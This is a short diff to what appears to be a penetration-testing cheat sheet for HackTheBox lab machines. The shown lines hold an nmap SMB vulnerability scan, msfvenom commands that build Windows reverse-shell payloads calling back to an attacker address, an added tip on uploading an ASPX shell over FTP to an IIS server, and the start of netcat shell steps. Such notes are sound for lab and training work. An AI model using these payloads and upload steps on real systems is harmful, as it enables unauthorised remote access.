@@ -180,6 +180,7 @@ Password Protected SSH Private Key:
 	- Port 445: sudo nmap -Pn -p 445 --script smb-vuln-* legacy.htb
 	- msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=1234 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 		- msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f aspx > shell.aspx
+		- when uploading this shell to an ftp server that is connected to an IIS, FTP to the server, run "bin" and upload the shell. 
 	- After establishing RCE on a machine, follow these steps to get a shell: 
 		- On attacker machine: 
 			- Locate and copy nc.exe to a dir of your choice
